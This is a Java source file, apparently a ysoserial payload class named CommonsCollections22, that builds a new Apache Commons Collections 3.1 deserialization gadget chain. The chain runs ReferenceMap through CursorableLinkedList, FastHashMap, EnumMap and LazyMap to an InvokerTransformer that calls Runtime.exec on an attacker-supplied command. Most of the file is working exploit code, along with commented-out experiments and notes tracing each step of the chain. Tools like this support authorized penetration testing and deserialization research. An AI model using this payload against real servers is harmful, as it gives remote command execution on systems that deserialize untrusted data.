package ysoserial.payloads;

import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.list.CursorableLinkedList;
import org.apache.commons.collections.map.*;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;

/*
    Cluster4_20220605-162453, fourth chain.
	Gadget chain:

        chain_ReferenceIdentityMap31-readObject-1e8977356299b014c4e0090fb1f3d1461d122f6b.txt
            [
             <org.apache.commons.collections.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
             <org.apache.commons.collections.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
             <org.apache.commons.collections.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
             <org.apache.commons.collections.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
             <org.apache.commons.collections.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
             <org.apache.commons.collections.CursorableLinkedList: boolean equals(java.lang.Object)>
             <org.apache.commons.collections.FastHashMap: boolean equals(java.lang.Object)>
             <java.util.EnumMap: boolean equals(java.lang.Object)>
             <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
             <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
             <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections22 extends PayloadRunner implements ObjectPayload<ReferenceMap> {
    enum ProvaEnum {
        zZ,
        yy
    }

    public ReferenceMap getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new org.apache.commons.collections.functors.InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new org.apache.commons.collections.functors.InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        //Object templates = Gadgets.createTemplatesImpl(command);

        // setup harmless chain
        //final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // LazyMap.get() it should be called with an input parameter that is a key not already existing in the map, so that the transformer will be called on that key.
//        LazyMap.get();
        // The InvokerTransformer should be set as the LazyMap transformer (via reflection or lazyMap method).
        // The LazyMap.get should be called via Flat3Map.equals, to do so the input parameter of equals should be a LazyMap,
        //  and the LazyMap should not contain a key existing in the Flat3Map, the LazyMap.get will be called with the key
        //  of the Flat3Map as input parameter
        //    Flat3Map;
        // Flat3Map.equals should be called by FastHashMap.equals, to do so the input parameter should be a map with a value of LazyMap
        //  where his key should be the same key contained in the FastHashMap (not sure about the key thing).
        //    FastHashMap
        // FastHashMap.equals should be called by CursorableLinkedList.equals, to do so the input parameter should be a
        //  list with a map containing the LazyMap as value of a key. And the CursorableLinkedList should contain a FastHashMap.
        //    CursorableLinkedList
        // CursorableLinkedList.equals should be called by AbstractHashedMap.isEqualKey, to do so two different objects "key" that results
        //  or not equal in an equals method should be passed as parameters of the isEqualKey method.
//        AbstractHashedMap;
        // AbstractHashedMap.isEqualKey should be called by AbstractHashedMap.put, so the insertion of an object should fire the isEqualKey check.
        //  To do so we should have data not null inside the AbstractHashMap and then the method isEqualKey would be called with as parameter:
        //  the input key of the put parameter and a key from the AbstractHashMap entry analyzed, so the map must contain at least
        //  another entry different from the one we are trying to insert at this moment.
        // AbstractHashedMap.put is be called by AbstractReferenceMap.put, via super.put(key, value)
        // AbstractReferenceMap.put is called by AbstractReferenceMap.doReadObject, this happens when the AbstractReferenceMap
        //  object is deserialized, and it's content in byte is read and put inside the map.
        // Lastly AbstractReferenceMap.doReadObject is called by ReferenceIdentityMap.readObject during the normal deserialization process.
//        ReferenceIdentityMap;

        //Object object = new Object();
        //EnumMap enumMap = new EnumMap(object);

        /* Map<Object, Object> lazyMap = LazyMap.lazyMap(new LRUMap<Object, Object>(), transformer);
        lazyMap.put(templates, templates);
        Object templ = lazyMap.get(templates);*/

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map innerMap3 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("Aa", 1); // yh

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("BB", 1); // zI

        /* LRUMap<Object, Object> outputLRUMap = new LRUMap<Object, Object>();
        //outputLRUMap.put(templates, templates);
        Flat3Map<String, Integer> flat3map1 = new Flat3Map<String, Integer>();
        flat3map1.put("zZ", 1);
        flat3map1.put("yy", 1);
        outputLRUMap.put(flat3map1, 1); */

        //Object templates2 = Gadgets.createTemplatesImpl(command);
        /*Object templates2 = templates;
        //outputLRUMap.put(templates2, templates2);
        Flat3Map<String, Integer> flat3map2 = new Flat3Map<String, Integer>();
        flat3map2.put("zZ", 1);
        outputLRUMap.put(flat3map2, 2);*/

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        /*Map lazyMap3 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap3.put("yy", 1);

        Map lazyMap4 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap4.put("zZ", 1);
*/

        Map lazyMapEnum = LazyMap.decorate(innerMap3, transformerChain);
        lazyMapEnum.put(ProvaEnum.zZ, 5);
        EnumMap<ProvaEnum, Map<ProvaEnum,Object>> enumMap1 = new EnumMap(ProvaEnum.class);
        enumMap1.put(ProvaEnum.zZ, lazyMapEnum);

        FastHashMap fastHashMap1 = new FastHashMap();
        fastHashMap1.put(lazyMap1, enumMap1); // 1
        //flat3map1.put(flat3map1, 1);

        FastHashMap fastHashMap2 = new FastHashMap();
        //fastHashMap2.put(lazyMap2, lazyMap4);
        fastHashMap2.put(lazyMap2, enumMap1);
        //flat3map2.put(flat3map2, 2);
        CursorableLinkedList cursorableLinkedList1 = new CursorableLinkedList();
        cursorableLinkedList1.add(fastHashMap1);
        CursorableLinkedList cursorableLinkedList2 = new CursorableLinkedList();
        cursorableLinkedList2.add(fastHashMap2);


        /*EnumMap enumMap2 = new EnumMap(lazyMap1);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, new Object());*/

        // Use the colliding Maps as keys in ReferenceIdentityMap
        ReferenceMap referenceMap = new ReferenceMap();
        referenceMap.put(cursorableLinkedList1, 1);
        referenceMap.put(cursorableLinkedList2, 2);
        /*LRUMap outputLRUMap = new LRUMap();
        outputLRUMap.put(lazyMap1, 1);
        outputLRUMap.put(lazyMap2, 2);*/

        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return referenceMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections22.class, args);
    }

}
